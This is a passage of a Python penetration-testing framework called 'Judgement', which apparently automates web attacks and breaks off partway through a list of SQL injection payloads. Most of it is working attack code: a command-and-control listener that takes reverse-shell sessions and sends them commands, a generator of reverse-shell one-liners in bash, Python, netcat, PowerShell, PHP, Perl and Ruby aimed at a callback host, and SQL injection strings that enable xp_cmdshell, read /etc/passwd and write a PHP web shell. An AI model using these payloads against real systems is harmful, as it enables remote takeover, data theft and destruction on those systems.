#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗██╗   ██╗██████╗ ███████╗███╗   ██╗████████╗███████╗
██╔════╝██║   ██║██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝
███████╗██║   ██║██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  
╚════██║██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  
███████║╚██████╔╝██████╔╝███████╗██║ ╚████║   ██║   ███████╗
╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝

.Judgement. Ultimate Security Testing Framework
Professional Penetration Testing Automation with Intelligent Chaining
"""

import os
import sys
import time
import json
import hashlib
import random
import base64
import threading
import urllib3
import requests
import sqlite3
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse, quote_plus, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from collections import defaultdict, Counter

# Rich for UI
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.prompt import Prompt, Confirm
from rich.text import Text
from rich import print as rprint
from rich.tree import Tree
from rich.markdown import Markdown

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
CONFIG_FILE = "config/judgement_config.json"
WORDLIST_DIR = "wordlists/"
PAYLOAD_DIR = "payloads/"
LOG_DIR = "logs/"
REPORT_DIR = "reports/"
SECLISTS_DIR = "seclists/"
TEMP_DIR = "temp/"
DB_FILE = "judgement.db"
VULN_FIELDS_FILE = "vuln_fields.json"

# Ensure directories exist
for directory in [WORDLIST_DIR, PAYLOAD_DIR, LOG_DIR, REPORT_DIR, SECLISTS_DIR, TEMP_DIR]:
    os.makedirs(directory, exist_ok=True)

# Default configuration
DEFAULT_CONFIG = {
    "threads": 50,
    "timeout": 20,
    "delay": 0.01,
    "max_retries": 3,
    "user_agent": "Judgement/5.0 (Ultimate Security Testing Framework)",
    "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    },
    "seclists": {
        "auto_download": True,
        "sources": [
            "https://github.com/danielmiessler/SecLists/archive/master.zip"
        ]
    },
    "fuzzing": {
        "extensions": [".php", ".html", ".asp", ".aspx", ".jsp", ".cgi", ".pl", ".sh", ".bak", ".backup", ".old", ".swp", "~", ".tmp", ".temp", ".log", ".txt", ".conf", ".config", ".db", ".sql"],
        "methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
        "payloads": {
            "sql_injection": "payloads/sql_injection.txt",
            "xss": "payloads/xss.txt",
            "command_injection": "payloads/command_injection.txt",
            "ssti": "payloads/ssti.txt",
            "path_traversal": "payloads/path_traversal.txt",
            "xxe": "payloads/xxe.txt",
            "ssrf": "payloads/ssrf.txt",
            "ldap_injection": "payloads/ldap_injection.txt",
            "nosql_injection": "payloads/nosql_injection.txt",
            "xpath_injection": "payloads/xpath_injection.txt",
            "crlf_injection": "payloads/crlf_injection.txt",
            "http_header_injection": "payloads/http_header_injection.txt"
        }
    },
    "villain": {
        "enabled": True,
        "default_host": "0.0.0.0",
        "default_port": 4444,
        "callback_url": "http://127.0.0.1:4444",
        "auto_start_listener": True,
        "evidence_capture": True,
        "session_timeout": 300
    },
    "bruteforce": {
        "usernames": "wordlists/usernames.txt",
        "passwords": "wordlists/passwords.txt",
        "credentials": "wordlists/credentials.txt"
    },
    "scanning": {
        "depth": "deep",  # options: quick, normal, deep, thorough
        "aggression": "balanced",  # options: stealth, balanced, aggressive
        "detection_level": "intelligent"  # options: basic, advanced, intelligent
    },
    "reporting": {
        "format": "html",  # options: json, html, pdf
        "auto_save": True,
        "include_evidence": True
    }
}

def load_config():
    """Load configuration from file or create default"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG

def save_config(config):
    """Save configuration to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

class DatabaseManager:
    """Database manager for storing findings and reports"""
    
    def __init__(self, db_file=DB_FILE):
        self.db_file = db_file
        self.lock = threading.Lock()  # Add lock to prevent database locking
        self.init_database()
        
    def get_connection(self):
        """Get a database connection with retry mechanism"""
        for attempt in range(3):
            try:
                conn = sqlite3.connect(self.db_file, timeout=20.0, check_same_thread=False)
                return conn
            except sqlite3.OperationalError as e:
                if "database is locked" in str(e) and attempt < 2:
                    time.sleep(0.5)
                    continue
                else:
                    raise e
        raise sqlite3.OperationalError("Database is locked after multiple attempts")
        
    def init_database(self):
        """Initialize the database with required tables"""
        with self.lock:  # Use lock to prevent concurrent access
            conn = self.get_connection()
            cursor = conn.cursor()
            
            # Create findings table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS findings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_id TEXT,
                    target TEXT,
                    finding_type TEXT,
                    severity TEXT,
                    url TEXT,
                    parameter TEXT,
                    payload TEXT,
                    evidence TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create scans table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id TEXT PRIMARY KEY,
                    target TEXT,
                    scan_type TEXT,
                    start_time DATETIME,
                    end_time DATETIME,
                    status TEXT
                )
            ''')
            
            # Create parameters table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS parameters (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_id TEXT,
                    url TEXT,
                    method TEXT,
                    parameter_name TEXT,
                    parameter_type TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create targets table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_id TEXT,
                    url TEXT,
                    discovered_from TEXT,
                    confidence INTEGER,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create vulnerable fields table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vulnerable_fields (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_id TEXT,
                    url TEXT,
                    parameter_name TEXT,
                    vulnerability_type TEXT,
                    payload TEXT,
                    evidence TEXT,
                    confidence INTEGER,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
        
    def save_finding(self, scan_id, target, finding_type, severity, url, parameter=None, payload=None, evidence=None):
        """Save a finding to the database"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO findings (scan_id, target, finding_type, severity, url, parameter, payload, evidence)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (scan_id, target, finding_type, severity, url, parameter, payload, evidence))
            
            conn.commit()
            conn.close()
        
    def save_scan(self, scan_id, target, scan_type, start_time, end_time=None, status="running"):
        """Save scan metadata"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO scans (id, target, scan_type, start_time, end_time, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (scan_id, target, scan_type, start_time, end_time, status))
            
            conn.commit()
            conn.close()
        
    def save_parameter(self, scan_id, url, method, parameter_name, parameter_type):
        """Save discovered parameter"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO parameters (scan_id, url, method, parameter_name, parameter_type)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_id, url, method, parameter_name, parameter_type))
            
            conn.commit()
            conn.close()
        
    def save_target(self, scan_id, url, discovered_from=None, confidence=50):
        """Save discovered target"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO targets (scan_id, url, discovered_from, confidence)
                VALUES (?, ?, ?, ?)
            ''', (scan_id, url, discovered_from, confidence))
            
            conn.commit()
            conn.close()
        
    def save_vulnerable_field(self, scan_id, url, parameter_name, vulnerability_type, payload, evidence, confidence=80):
        """Save vulnerable field information"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO vulnerable_fields (scan_id, url, parameter_name, vulnerability_type, payload, evidence, confidence)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (scan_id, url, parameter_name, vulnerability_type, payload, evidence, confidence))
            
            conn.commit()
            conn.close()
            
            # Also save to JSON file
            self._save_vuln_field_to_file(scan_id, url, parameter_name, vulnerability_type, payload, evidence, confidence)
        
    def _save_vuln_field_to_file(self, scan_id, url, parameter_name, vulnerability_type, payload, evidence, confidence):
        """Save vulnerable field to JSON file"""
        vuln_data = {
            "scan_id": scan_id,
            "url": url,
            "parameter_name": parameter_name,
            "vulnerability_type": vulnerability_type,
            "payload": payload,
            "evidence": evidence,
            "confidence": confidence,
            "timestamp": datetime.now().isoformat()
        }
        
        # Load existing data
        vuln_fields = []
        if os.path.exists(VULN_FIELDS_FILE):
            try:
                with open(VULN_FIELDS_FILE, 'r') as f:
                    vuln_fields = json.load(f)
            except:
                vuln_fields = []
        
        # Add new entry
        vuln_fields.append(vuln_data)
        
        # Save updated data
        with open(VULN_FIELDS_FILE, 'w') as f:
            json.dump(vuln_fields, f, indent=2)
        
    def get_findings(self, scan_id=None):
        """Retrieve findings from the database"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if scan_id:
                cursor.execute('SELECT * FROM findings WHERE scan_id = ?', (scan_id,))
            else:
                cursor.execute('SELECT * FROM findings')
                
            findings = cursor.fetchall()
            conn.close()
            return findings
        
    def get_parameters(self, scan_id=None):
        """Retrieve parameters from the database"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if scan_id:
                cursor.execute('SELECT * FROM parameters WHERE scan_id = ?', (scan_id,))
            else:
                cursor.execute('SELECT * FROM parameters')
                
            parameters = cursor.fetchall()
            conn.close()
            return parameters
        
    def get_targets(self, scan_id=None):
        """Retrieve targets from the database"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if scan_id:
                cursor.execute('SELECT * FROM targets WHERE scan_id = ?', (scan_id,))
            else:
                cursor.execute('SELECT * FROM targets')
                
            targets = cursor.fetchall()
            conn.close()
            return targets
            
    def get_vulnerable_fields(self, scan_id=None):
        """Retrieve vulnerable fields from the database"""
        with self.lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            
            if scan_id:
                cursor.execute('SELECT * FROM vulnerable_fields WHERE scan_id = ?', (scan_id,))
            else:
                cursor.execute('SELECT * FROM vulnerable_fields')
                
            vuln_fields = cursor.fetchall()
            conn.close()
            return vuln_fields

class Logger:
    """Centralized logging for security testing"""
    
    def __init__(self):
        self.log_file = os.path.join(LOG_DIR, f"judgement_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        rprint(log_entry)
        with open(self.log_file, 'a') as f:
            f.write(log_entry + "\n")

class SecListsManager:
    """Advanced SecLists integration and management"""
    
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.seclists_path = SECLISTS_DIR
        
    def download_seclists(self):
        """Download and extract SecLists"""
        self.logger.log("Initializing SecLists integration...")
        
        if not self.config["seclists"]["auto_download"]:
            self.logger.log("SecLists auto-download disabled", "INFO")
            return
            
        sources = self.config["seclists"]["sources"]
        
        for source in sources:
            self.logger.log(f"Downloading SecLists from {source}")
            
            try:
                # In a real implementation, this would download SecLists
                # For demo, we'll create mock files
                self._create_mock_seclists()
                self.logger.log("SecLists integration complete")
                return
                
            except Exception as e:
                self.logger.log(f"Failed to download SecLists: {e}", "ERROR")
                
    def _create_mock_seclists(self):
        """Create mock SecLists for demonstration"""
        # Create directory structure
        dirs = [
            "Discovery/Web-Content",
            "Fuzzing/Databases",
            "Fuzzing/XSS",
            "Fuzzing/command-injection",
            "Fuzzing/SSTI",
            "Fuzzing/LFI",
            "Usernames",
            "Passwords/Common-Credentials",
            "Passwords/Leaked-Databases"
        ]
        
        for d in dirs:
            os.makedirs(os.path.join(self.seclists_path, d), exist_ok=True)
            
        # Create mock wordlists
        mock_data = {
            "Discovery/Web-Content/directory-list-2.3-small.txt": [
                "admin", "login", "config", "backup", "test", "dev", "api", "v1", "v2",
                "upload", "images", "js", "css", "tmp", "temp", "logs", "database",
                "secret", "private", "internal", "debug", "monitor", "status"
            ],
            "Discovery/Web-Content/common.txt": [
                "index", "home", "about", "contact", "services", "products",
                "blog", "news", "support", "help", "docs", "documentation"
            ],
            "Usernames/top-usernames-shortlist.txt": [
                "admin", "root", "user", "test", "guest", "demo", "manager",
                "operator", "supervisor", "administrator", "webadmin"
            ],
            "Passwords/Common-Credentials/rockyou-75.txt": [
                "password", "123456", "qwerty", "admin123", "welcome",
                "password123", "admin1234", "root123", "test123"
            ]
        }
        
        for file_path, words in mock_data.items():
            full_path = os.path.join(self.seclists_path, file_path)
            with open(full_path, 'w') as f:
                for word in words:
                    f.write(word + '\n')
                    
    def get_wordlists(self, category=None):
        """Get SecLists wordlists by category"""
        wordlists = {}
        
        if category:
            category_path = os.path.join(self.seclists_path, category)
            if os.path.exists(category_path):
                for root, dirs, files in os.walk(category_path):
                    for file in files:
                        if file.endswith(('.txt', '.lst')):
                            rel_path = os.path.relpath(os.path.join(root, file), self.seclists_path)
                            wordlists[rel_path] = os.path.join(root, file)
        else:
            # Get all wordlists
            for root, dirs, files in os.walk(self.seclists_path):
                for file in files:
                    if file.endswith(('.txt', '.lst')):
                        rel_path = os.path.relpath(os.path.join(root, file), self.seclists_path)
                        wordlists[rel_path] = os.path.join(root, file)
                        
        return wordlists

class VillainManager:
    """Villain C2 Framework Integration and Management"""
    
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.listeners = {}
        self.active_sessions = {}
        self.evidence_capture = EvidenceCapture(logger)
        self.listener_port = config.get("villain", {}).get("default_port", 4444)
        self.listener_host = config.get("villain", {}).get("default_host", "0.0.0.0")
        self.callback_url = config.get("villain", {}).get("callback_url", f"http://127.0.0.1:{self.listener_port}")
        self._initialize_villain()
        
    def _initialize_villain(self):
        """Initialize Villain C2 framework"""
        self.logger.log("Initializing Villain C2 framework...")
        
        # Create villain directory structure
        os.makedirs("villain", exist_ok=True)
        os.makedirs("villain/payloads", exist_ok=True)
        os.makedirs("villain/listeners", exist_ok=True)
        os.makedirs("villain/sessions", exist_ok=True)
        os.makedirs("villain/evidence", exist_ok=True)
        
    def start_listener(self, port=None, interface="0.0.0.0"):
        """Start a Villain listener"""
        if port is None:
            port = self.listener_port
            
        listener_id = f"listener_{port}_{int(time.time())}"
        
        try:
            # Create listener thread
            listener_thread = threading.Thread(
                target=self._listener_worker,
                args=(listener_id, interface, port),
                daemon=True
            )
            listener_thread.start()
            
            self.listeners[listener_id] = {
                "id": listener_id,
                "interface": interface,
                "port": port,
                "status": "active",
                "thread": listener_thread,
                "start_time": datetime.now().isoformat(),
                "connections": 0
            }
            
            self.logger.log(f"Started Villain listener {listener_id} on {interface}:{port}")
            return listener_id
            
        except Exception as e:
            self.logger.log(f"Failed to start listener: {e}")
            return None
            
    def _listener_worker(self, listener_id, interface, port):
        """Listener worker thread"""
        import socket
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((interface, port))
            sock.listen(5)
            
            self.logger.log(f"Listener {listener_id} waiting for connections on {interface}:{port}")
            
            while True:
                client_socket, client_address = sock.accept()
                
                # Update connection count
                if listener_id in self.listeners:
                    self.listeners[listener_id]["connections"] += 1
                
                # Handle new session
                session_id = self._handle_new_session(client_socket, client_address, listener_id)
                self.logger.log(f"New session {session_id} from {client_address[0]}:{client_address[1]}")
                
        except Exception as e:
            self.logger.log(f"Listener {listener_id} error: {e}")
            
    def _handle_new_session(self, client_socket, client_address, listener_id):
        """Handle new incoming session"""
        session_id = f"session_{int(time.time())}_{random.randint(1000, 9999)}"
        
        session_info = {
            "id": session_id,
            "listener_id": listener_id,
            "client_ip": client_address[0],
            "client_port": client_address[1],
            "start_time": datetime.now().isoformat(),
            "status": "active",
            "socket": client_socket,
            "commands_executed": [],
            "evidence": []
        }
        
        self.active_sessions[session_id] = session_info
        
        # Start session handler thread
        session_thread = threading.Thread(
            target=self._session_handler,
            args=(session_id, client_socket),
            daemon=True
        )
        session_thread.start()
        
        # Capture evidence of new connection
        self.evidence_capture.capture_connection(session_info)
        
        return session_id
        
    def _session_handler(self, session_id, client_socket):
        """Handle individual session communications"""
        try:
            # Send initial identification
            client_socket.send(b"Judgement C2 - Session Established\n")
            
            while True:
                # Simple command interface
                try:
                    client_socket.settimeout(30)
                    data = client_socket.recv(1024)
                    
                    if not data:
                        break
                        
                    command_output = data.decode('utf-8', errors='ignore').strip()
                    
                    if command_output:
                        # Log command execution
                        command_info = {
                            "timestamp": datetime.now().isoformat(),
                            "output": command_output,
                            "size": len(command_output)
                        }
                        
                        if session_id in self.active_sessions:
                            self.active_sessions[session_id]["commands_executed"].append(command_info)
                            
                        # Capture evidence
                        self.evidence_capture.capture_command_execution(session_id, command_info)
                        
                        self.logger.log(f"Session {session_id} command output: {command_output[:100]}...")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    self.logger.log(f"Session {session_id} communication error: {e}")
                    break
                    
        except Exception as e:
            self.logger.log(f"Session {session_id} handler error: {e}")
        finally:
            self._cleanup_session(session_id)
            
    def _cleanup_session(self, session_id):
        """Clean up session resources"""
        if session_id in self.active_sessions:
            session = self.active_sessions[session_id]
            try:
                session["socket"].close()
            except:
                pass
            session["status"] = "closed"
            session["end_time"] = datetime.now().isoformat()
            
            # Generate final evidence report
            self.evidence_capture.generate_session_report(session_id, session)
            
    def generate_callback_payloads(self, payload_type="bash"):
        """Generate callback payloads for various exploit types"""
        payloads = {}
        host = self.callback_url.split('://')[1].split(':')[0]
        port = self.listener_port
        
        # Basic reverse shell payloads
        if payload_type == "bash":
            payloads["bash_tcp"] = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
            payloads["bash_tcp_alt"] = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
            payloads["bash_tcp_encoded"] = f"echo 'bash -i >& /dev/tcp/{host}/{port} 0>&1' | base64 -d | bash"
            
        elif payload_type == "python":
            payloads["python_tcp"] = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            payloads["python3_tcp"] = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            
        elif payload_type == "nc":
            payloads["nc_tcp"] = f"nc -e /bin/sh {host} {port}"
            payloads["nc_tcp_alt"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
            payloads["ncat_tcp"] = f"ncat {host} {port} -e /bin/sh"
            
        elif payload_type == "powershell":
            payloads["powershell_tcp"] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            
        elif payload_type == "php":
            payloads["php_tcp"] = f"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
            payloads["php_tcp_alt"] = f"""php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
            
        elif payload_type == "perl":
            payloads["perl_tcp"] = f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
            
        elif payload_type == "ruby":
            payloads["ruby_tcp"] = f"""ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
            
        return payloads
        
    def get_active_listeners(self):
        """Get information about active listeners"""
        return self.listeners
        
    def get_active_sessions(self):
        """Get information about active sessions"""
        return self.active_sessions
        
    def stop_listener(self, listener_id):
        """Stop a specific listener"""
        if listener_id in self.listeners:
            self.listeners[listener_id]["status"] = "stopped"
            self.logger.log(f"Stopped listener {listener_id}")
            return True
        return False
        
    def execute_command_on_session(self, session_id, command):
        """Execute command on active session"""
        if session_id in self.active_sessions:
            session = self.active_sessions[session_id]
            try:
                session["socket"].send((command + "\n").encode())
                return True
            except Exception as e:
                self.logger.log(f"Failed to execute command on session {session_id}: {e}")
        return False


class EvidenceCapture:
    """Evidence capture and documentation system"""
    
    def __init__(self, logger):
        self.logger = logger
        self.evidence_dir = "villain/evidence"
        os.makedirs(self.evidence_dir, exist_ok=True)
        
    def capture_connection(self, session_info):
        """Capture evidence of new connection"""
        evidence_file = os.path.join(self.evidence_dir, f"connection_{session_info['id']}.json")
        
        evidence = {
            "type": "connection_established",
            "timestamp": session_info["start_time"],
            "session_id": session_info["id"],
            "source_ip": session_info["client_ip"],
            "source_port": session_info["client_port"],
            "listener_id": session_info["listener_id"]
        }
        
        try:
            with open(evidence_file, 'w') as f:
                json.dump(evidence, f, indent=2)
            self.logger.log(f"Captured connection evidence: {evidence_file}")
        except Exception as e:
            self.logger.log(f"Failed to capture connection evidence: {e}")
            
    def capture_command_execution(self, session_id, command_info):
        """Capture evidence of command execution"""
        evidence_file = os.path.join(self.evidence_dir, f"commands_{session_id}.json")
        
        # Load existing evidence or create new
        try:
            if os.path.exists(evidence_file):
                with open(evidence_file, 'r') as f:
                    evidence_data = json.load(f)
            else:
                evidence_data = {
                    "type": "command_execution_log",
                    "session_id": session_id,
                    "commands": []
                }
                
            evidence_data["commands"].append(command_info)
            
            with open(evidence_file, 'w') as f:
                json.dump(evidence_data, f, indent=2)
                
        except Exception as e:
            self.logger.log(f"Failed to capture command evidence: {e}")
            
    def generate_session_report(self, session_id, session_data):
        """Generate comprehensive session report"""
        report_file = os.path.join(self.evidence_dir, f"session_report_{session_id}.html")
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Session Report - {session_id}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
                .command {{ background-color: #f8f9fa; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }}
                .timestamp {{ color: #6c757d; font-size: 0.9em; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Judgement C2 Session Report</h1>
                <p>Session ID: {session_id}</p>
                <p>Generated: {datetime.now().isoformat()}</p>
            </div>
            
            <div class="section">
                <h2>Session Information</h2>
                <p><strong>Client IP:</strong> {session_data.get('client_ip', 'N/A')}</p>
                <p><strong>Client Port:</strong> {session_data.get('client_port', 'N/A')}</p>
                <p><strong>Start Time:</strong> {session_data.get('start_time', 'N/A')}</p>
                <p><strong>End Time:</strong> {session_data.get('end_time', 'N/A')}</p>
                <p><strong>Status:</strong> {session_data.get('status', 'N/A')}</p>
                <p><strong>Listener ID:</strong> {session_data.get('listener_id', 'N/A')}</p>
            </div>
            
            <div class="section">
                <h2>Command Execution Log</h2>
        """
        
        commands = session_data.get('commands_executed', [])
        if commands:
            for cmd in commands:
                html_content += f"""
                <div class="command">
                    <div class="timestamp">{cmd.get('timestamp', 'N/A')}</div>
                    <pre>{cmd.get('output', 'N/A')}</pre>
                </div>
                """
        else:
            html_content += "<p>No commands executed during this session.</p>"
            
        html_content += """
            </div>
        </body>
        </html>
        """
        
        try:
            with open(report_file, 'w') as f:
                f.write(html_content)
            self.logger.log(f"Generated session report: {report_file}")
        except Exception as e:
            self.logger.log(f"Failed to generate session report: {e}")


class PayloadGenerator:
    """Advanced payload generation with SecLists integration"""
    
    def __init__(self, config, logger, seclists_manager, villain_manager=None):
        self.config = config
        self.logger = logger
        self.seclists_manager = seclists_manager
        self.villain_manager = villain_manager
        self.payloads = {}
        self._initialize_payloads()
        
    def _initialize_payloads(self):
        """Initialize payloads from SecLists"""
        self.logger.log("Initializing advanced payloads...")
        
        # Generate payload files from SecLists
        payload_categories = self.config["fuzzing"]["payloads"]
        
        for category, filepath in payload_categories.items():
            payloads = self._generate_payloads(category)
            if payloads:
                os.makedirs(os.path.dirname(filepath), exist_ok=True)
                with open(filepath, 'w') as f:
                    for payload in payloads:
                        f.write(payload + '\n')
                self.payloads[category] = payloads
                self.logger.log(f"Generated {len(payloads)} {category} payloads")
                
        # Generate callback payloads if Villain is enabled
        if self.villain_manager and self.config.get("villain", {}).get("enabled", False):
            self._generate_callback_payloads()
                
    def _generate_callback_payloads(self):
        """Generate callback payloads that connect back to Villain listeners"""
        self.logger.log("Generating callback payloads for Villain C2...")
        
        callback_categories = ["bash", "python", "nc", "powershell", "php", "perl", "ruby"]
        
        for payload_type in callback_categories:
            callback_payloads = self.villain_manager.generate_callback_payloads(payload_type)
            
            if callback_payloads:
                # Save callback payloads to files
                callback_file = f"payloads/callback_{payload_type}.txt"
                os.makedirs(os.path.dirname(callback_file), exist_ok=True)
                
                with open(callback_file, 'w') as f:
                    for payload_name, payload_content in callback_payloads.items():
                        f.write(f"# {payload_name}\n{payload_content}\n\n")
                
                self.payloads[f"callback_{payload_type}"] = list(callback_payloads.values())
                self.logger.log(f"Generated {len(callback_payloads)} {payload_type} callback payloads")
                
    def get_callback_payloads(self, payload_type="all"):
        """Get callback payloads for injection into exploits"""
        if payload_type == "all":
            all_callbacks = {}
            for key, payloads in self.payloads.items():
                if key.startswith("callback_"):
                    all_callbacks[key] = payloads
            return all_callbacks
        else:
            return self.payloads.get(f"callback_{payload_type}", [])
                
    def _generate_payloads(self, category):
        """Generate payloads for a specific category"""
        # Get callback host and port for reverse shell payloads
        callback_host = "127.0.0.1"
        callback_port = "4444"
        
        if self.villain_manager:
            callback_host = self.villain_manager.callback_url.split('://')[1].split(':')[0]
            callback_port = str(self.villain_manager.listener_port)
        
        payload_data = {
            "sql_injection": [
                "' OR '1'='1", 
                "' OR '1'='1' --", 
                "' OR '1'='1' /*", 
                "') OR ('1'='1", 
                "'; DROP TABLE users; --",
                "UNION SELECT NULL, username, password FROM users--",
                "'; EXEC xp_cmdshell('whoami')--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "OR 1=1",
                "OR 1=1--",
                "OR 1=1#",
                "OR 1=1/*",
                "' OR 'a'='a",
                "' OR 'a'='a'--",
                "' OR 'a'='a'#",
                "' OR 'a'='a'/*",
                "') OR ('a'='a",
                "') OR ('a'='a'--",
                "') OR ('a'='a'#",
                "') OR ('a'='a'/*",
                "1 OR 1=1",
                "1 OR 1=1--",
                "1 OR 1=1#",
                "1 OR 1=1/*",
                "1' OR 1=1#",
                "1' OR 1=1--",
                "1' OR 1=1/*",
                "1') OR 1=1#",
                "1') OR 1=1--",
                "1') OR 1=1/*",
                "admin'--",
                "admin' #",
                "admin'/*",
                "admin' or '1'='1",
                "admin' or '1'='1'--",
                "admin' or '1'='1'#",
                "admin' or '1'='1'/*",
                "admin'or 1=1 or ''='",
                "admin' or 1=1",
                "admin' or 1=1--",
                "admin' or 1=1#",
                "admin' or 1=1/*",
                "admin') or ('1'='1",
                "admin') or ('1'='1'--",
                "admin') or ('1'='1'#",
                "admin') or ('1'='1'/*",
                "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "concat(0x3c2f7370616e3e,0x3c7363726970743e616c657274282258535322293c2f7363726970743e,0x3c7370616e3e)",
                "system('cat /etc/passwd')",
                "exec xp_cmdshell('dir')",
                "exec master..xp_cmdshell 'dir'",
                "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;",
                "@@version",
                "version()",
                "database()",
                "user()",
                "current_user()",
                "connection_id()",
                "schema_name()",
                "table_name",
                "column_name",
                "load_file('/etc/passwd')",
                "into outfile '/var/www/html/shell.php'",
                "into dumpfile '/var/www/html/shell.php'",
                "group_concat(table_name)",
                "group_concat(column_name)",
